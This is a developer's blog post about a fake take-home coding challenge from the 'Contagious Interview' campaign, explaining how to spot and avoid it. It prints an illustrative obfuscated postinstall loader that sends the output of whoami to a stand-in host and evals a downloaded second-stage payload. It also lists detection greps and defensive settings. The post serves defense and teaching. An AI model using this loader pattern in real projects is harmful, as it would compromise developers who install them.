---
title: "How a Fake Job-Interview Repo Tried to Steal My Keys (and How I Caught It)"
tags: ["security","javascript","webdev","career"]
publish: false
---

The message looked completely normal. A recruiter, a short pitch, a "take-home challenge" hosted on GitHub. Clone it, run `npm install`, get the dev server up, build a small feature, send it back. Standard stuff. I have done a dozen of these. This one was trying to steal my wallet keys and browser session data before I ever wrote a line of code.

It did not hide the malware in the app. It hid it in the build tooling. That is the whole trick, and it is the reason a lot of experienced developers get caught. You read `src/`, it looks fine, so you trust it. Nobody reads the lockfile. Nobody reads the postinstall script. That is exactly where the payload lives.

Here is the full teardown: what the lure looks like, the exact red flags, how I investigated it without running it, and the defenses you should adopt today.

## The setup: Contagious Interview

This is a known campaign. Security researchers track it as "Contagious Interview," attributed to North Korea-aligned actors. The pattern is consistent:

1. You get contacted about a job, often blockchain or full-stack, often with a salary that is a little too good.
2. You are given a code repository to clone and run as a "technical assessment."
3. The repo runs malicious code at install or build time, not at runtime.
4. The payload pulls a second-stage downloader, grabs your environment variables, crypto wallet files, browser-stored credentials, and keychain data, then exfiltrates them to a remote host.

The genius of it is the framing. A normal developer reflex when running untrusted code is "I will read the code before I trust it." But you read the *application* code. You do not read what `npm install` does, because `npm install` is something you run a hundred times a week without thinking.

## Red flag 1: a postinstall script that does not belong

The first thing I do with any unfamiliar repo is open `package.json` and read the `scripts` block. Specifically, I look for lifecycle hooks: `preinstall`, `install`, `postinstall`, `prepare`. These run automatically when you type `npm install`. You do not call them. They call themselves.

This repo had one:

```json
{
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "postinstall": "node ./scripts/setup-env.js"
  }
}
```

A file called `setup-env.js` running automatically after install. That name is chosen to sound boring. "Setup env" sounds like it copies a `.env.example`. Legitimate postinstall scripts exist (native module compilation, husky), but a hand-rolled `node ./scripts/...js` in a take-home challenge has no reason to exist. There is nothing to build at install time in a Vite starter.

## Red flag 2: the "config" file is obfuscated

I opened `scripts/setup-env.js`. It was not readable JavaScript. It was minified and obfuscated, the kind of thing you only ship in a production bundle, never in source you are handing to a candidate to read.

A representative version of what these payloads look like (this is an illustration of the pattern, not a copy-paste of live malware):

```js
const _0x4a = ['ZW52', 'aHR0cHM6Ly8=', 'L2FwaS9j'];
const a = (i) => Buffer.from(_0x4a[i], 'base64').toString();
const h = require(a(0).toLowerCase());
const p = require('child_process');

const u = a(1) + 'cdn-assets-delivery.tld' + a(2);
h.get(u + '?h=' + p.execSync('whoami'), (r) => {
  let d = '';
  r.on('data', (c) => (d += c));
  r.on('end', () => eval(Buffer.from(d, 'base64').toString()));
});
```

Walk through it. Hex-named variables (`_0x4a`) are a hallmark of automated obfuscators. Strings are base64-encoded so they do not show up in a text search for `http` or `eval`. It builds a URL to a host with a trustworthy-sounding name (`cdn-assets-delivery`), tags the request with your username so the operators know who they hit, downloads a second-stage payload, and runs it with `eval`. The actual stealing logic never sits in the repo. It is fetched at install time and executed in memory.

The three things that should make your skin crawl, in one snippet:

- **base64-encoded strings** hiding URLs and module names
- **a network call at install time** to a non-package-registry host
- **`eval` of fetched content**, which means the real payload is never in the file you are reading

## Red flag 3: a dependency in package.json but missing from the lockfile

This is the subtle one, and it is the supply-chain evasion technique that made me certain this was deliberate rather than someone's messy repo.

`package.json` listed a dependency. The `package-lock.json` did not contain a resolved entry for it. That mismatch is not normal. When you install a package, npm writes its exact version, resolved URL, and integrity hash into the lockfile. A package present in the manifest but absent from the lock means the lockfile was never generated with that dependency installed, or it was hand-edited.

Why would an attacker want that? Because the lockfile pins integrity hashes. If the malicious package is *not* in the lockfile, npm resolves it fresh from the registry at install time, with no integrity pin, and the attacker can swap what that package resolves to. It also means a reviewer diffing the lockfile sees nothing suspicious, because the malicious dependency simply is not there to review.

How to catch it: compare the dependency names across both files.

```bash
# Names declared in the manifest
node -e "const p=require('./package.json');console.log([...Object.keys(p.dependencies||{}),...Object.keys(p.devDependencies||{})].sort().join('\n'))" > /tmp/manifest.txt

# Names actually pinned in the lockfile
node -e "const l=require('./package-lock.json');console.log(Object.keys(l.packages||{}).filter(k=>k.startsWith('node_modules/')).map(k=>k.replace('node_modules/','')).sort().join('\n'))" > /tmp/lock.txt

diff /tmp/manifest.txt /tmp/lock.txt
```

Anything in the manifest that is not in the lock is a question you need answered before you install.

## How I investigated without running it

The single most important decision: I never ran `npm install`. Not on my machine, not in a quick "just to see the dev server" moment of weakness. With a postinstall hook and an `eval` of fetched code, by the time the dev server is up, you are already owned.

Here is the order I work in, all of it static, none of it executing the project:

| Step | What I check | What I am looking for |
|------|--------------|------------------------|
| 1 | `package.json` scripts | `preinstall` / `install` / `postinstall` / `prepare` hooks |
| 2 | Any file referenced by those hooks | obfuscation, base64, `eval`, `child_process`, network calls |
| 3 | `package.json` vs lockfile | dependencies declared but not pinned |
| 4 | Minified or hex-named files in source | obfuscated payloads disguised as config |
| 5 | Network calls anywhere in build config | fetches to non-registry hosts at build time |

For reading the files, I use GitHub's web view or `git clone` with a guard: clone is safe because cloning does not execute anything. Cloning only writes files to disk. Installing is what runs code. So you can pull the repo down, read every file, run greps over it, and never trigger the payload, as long as you do not install or build.

A few greps that surface most of this in seconds:

```bash
# Lifecycle hooks
grep -E '"(pre|post)?install"|"prepare"' package.json

# Common payload primitives across the whole tree
grep -rEn "eval\(|child_process|execSync|Buffer\.from\(.*base64|atob\(" . --include=*.js --include=*.ts

# Network calls in places that should not have them
grep -rEn "https?://" scripts/ *.config.* 2>/dev/null
```

When all three of those light up in a take-home challenge, you do not have a candidate exercise. You have a lure.

## The defenses every developer should adopt

You do not need to be a security researcher to be safe here. You need a handful of defaults.

**Turn off install scripts globally.** This is the single highest-leverage change. Most projects do not need lifecycle scripts to install, and the ones that do will tell you loudly when something is missing.

```bash
npm config set ignore-scripts true
# or, for pnpm
pnpm config set ignore-scripts true
```

**Enforce a publish delay on dependencies.** A huge share of supply-chain attacks are caught and pulled within hours of publication. If your tooling refuses to install anything published in the last 24 hours, you dodge most of them automatically.

```bash
pnpm config set minimumReleaseAge 1440
```

**Read lockfile diffs in every PR.** A new resolved URL pointing somewhere other than the registry, a new integrity hash on a package you did not touch, a dependency that appears in the manifest but not the lock: these are reviewable, and most teams skip them entirely.

**Never install an untrusted repo on your main machine.** If you genuinely need to run a stranger's code, use a throwaway VM or a container with no access to your keychain, your wallet files, your SSH keys, or your real environment variables. The whole point of these payloads is that they run before you get a chance to sandbox anything, so the sandbox has to come first.

**Treat "recruiter sent me a repo to run" as hostile by default.** A real assessment can be reviewed before it is executed. If running the code is the very first required step, ask why.

## What I built after this

I caught this one because I have a habit of reading scripts and diffing lockfiles before I install anything. But that habit is manual, it is slow, and most developers do not have it. The red flags are mechanical: lifecycle hooks, obfuscated files, base64 plus `eval`, network calls at build time, dependencies missing from the lockfile. A machine can check all of those faster and more reliably than I can.

So I built one. It is a vanilla-TypeScript web app: you paste a GitHub repo URL, and it statically scans for build-time code execution, lockfile-evasion dependencies, and obfuscated payloads. It does not clone the repo, it does not install anything, and it does not run a single line of the target's code. It reads, it flags, it explains. Exactly the pass I did by hand, automated, so the next developer who gets one of these messages does not have to know which files to open.

The job was fake. The malware was real. The defense is boring, and that is the good news: ignore-scripts on, read your lockfiles, sandbox strangers' code, and never let "just run `npm install`" be step one.
